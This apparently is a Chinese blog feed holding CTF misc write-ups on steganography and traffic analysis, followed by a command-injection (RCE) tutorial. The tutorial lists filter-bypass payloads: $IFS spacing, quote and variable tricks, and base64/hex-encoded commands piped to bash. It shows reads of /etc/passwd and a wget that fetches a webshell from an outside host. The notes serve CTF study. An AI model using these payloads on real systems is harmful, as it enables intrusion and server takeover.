<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
<p>主要是HTTP流量，直接追踪流</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
<p>用<code>captfencoder</code>MD5一下结束战斗</p>
<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
<p>查完没有藏文件，那应该就是隐写了</p>
<p>结果没有发现隐写，感觉被骗了</p>
<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
<p>成功了，打开提取的文件发现有PK头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
<p>foremost出一下，要密码，先尝试弱密码爆破</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
<p>看来是改了后缀，010先查查看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
<p>演都不演了…</p>
<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
<p>盯完帧没有东西，看看副本，发现已经损坏</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
<p>（这里-其实是_）</p>
<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
<blockquote>
<p>[!NOTE]</p>
<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
</blockquote>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
crc32 flag.jpg</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
<p>水平有限，还是手敲罢</p>
<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
<p>鉴定为图片纯纯的诈骗（恼</p>
<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
<p>要画图，那么应该藏了坐标，010查一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
<blockquote>
<p>随波逐流</p>
</blockquote>
<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
<blockquote>
<p>脚本画图</p>
</blockquote>
<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
<p>​	<code>*gnuplot*</code>绘图</p>
<p>贴个脚本先</p>
<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
    re = res.read()
    res.close()
    
with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        for j in range(0, len(tem)):
            if tem[j] == &#x27;,&#x27;:
                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()</code></pre>

<p>得到去括号，去逗号的坐标值</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
<p>贴一下ubuntu下的下载和使用方法</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
gnuplot
plot <span class="string">&quot;output.txt&quot;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
<p>可以扫出来</p>
<p>​	<em>matplotlib</em>绘图</p>
<p>把原文本去括号，用脚本跑</p>
<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
import numpy as np
with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
    re = res.read()
    res.close()

with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()
x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
plt.plot(x, y, &#x27;.&#x27;)
plt.show()</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2025/01/21/RCE/</url>
    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
<p><strong>原理</strong></p>
<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
<p><strong>系统命令执行函数</strong></p>
<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
*** passthru() system()的平替，写个命令就会执行命令，自己能回显
*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
$command是要执行的命令。
$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
$pipes是一个引用变量，用于存储与进程相关的管道。
$cwd（可选）是设置子进程的当前工作目录。
$env（可选）是设置子进程的环境变量。
$other_options（可选）是其他选项，如设置超时等
不能直接回显
*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>

<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
<p>那么就需要管道符来支持：</p>
<p>*<strong>关于管道符</strong></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
<p><strong>For Windows：</strong></p>
<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p><strong>For Linux:</strong></p>
<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p>发现漏洞后，如何得到控制权呢？</p>
<p>最简单的漏洞就是找到注入点直接注</p>
<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>

<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>

<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>

<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>

<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
<p>%09绕过（相当于Tab键）</p>
<p>%0a–代表换行符</p>
<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
<p>%0d–回车换行</p>
<p>%a0–代表的是非断行空格</p>
<p>%00–%00代表的是ASCII码中的空字符</p>
<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
<p>内联注释绕过知识点</p>
<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
</code></pre>
<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
<pre><code class="highlight plaintext">cat /fl??

cat /f*  #多个匹配结果同时展现</code></pre>

<p>以上指令等效于<code>cat /flag</code></p>
<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag

c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>

<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>

<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>

<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
<pre><code class="highlight plaintext">cat /fl$9ag

cat /fl$@ag</code></pre>

<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x</code></pre>

<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
<p>echo $PATH              #PATH默认系统环境变量</p>
<p>如果出现：</p>
<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>

<p>则以下代码表示了flag.php</p>
<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>

<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>

<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
<p>执行命令的话有三种形式：</p>
<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash

$(echo Y2FOIGZsYWcucGhw | base64 -d)

`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>

<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>

<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
s = b&quot;tac flag&quot;
h = binascii.b2a_hex(s)
print(h)</code></pre>

<p>tac flag–&gt; 74616320666c6167</p>
<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>

<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>

<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);

?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);

?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>

<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
<p>别的指令也同理</p>
<ul>
<li><p>tac:反向显示，从最后一行开始往前显示</p>
<pre><code class="highlight plaintext">tac /flag</code></pre>


</li>
<li><p>more:一页一页显示档案内容</p>
<pre><code class="highlight plaintext">more flag.php</code></pre>


</li>
<li><p>less：与more类似</p>
</li>
<li><p>tail：查看末尾几行</p>
</li>
<li><p>nl：显示的时候，顺便输出行号</p>
<pre><code class="highlight plaintext">nl /flag</code></pre></li>
</ul>
<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
<ul>
<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
</ul>
<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>

<ul>
<li><p>xxd：读取二进制文件</p>
<pre><code class="highlight plaintext">xxd /flag</code></pre>


</li>
<li><p>sort：主要用于排序文件 </p>
<pre><code class="highlight plaintext">so?t /flag
/usr/bin/s?rt /flag</code></pre></li>
</ul>
<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
<ul>
<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
</ul>
<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
<ul>
<li>strings：<br>相当于cat</li>
</ul>
<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
<p>3.利用cp命令：cp flag.php 1.txt</p>
<p>4.利用mv命令：mv flag.php 1.txt</p>
<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
<p>7.利用wget下载：</p>
<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>

<p>8.dnslog外带数据</p>
<h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2>]]></content>
      <tags>
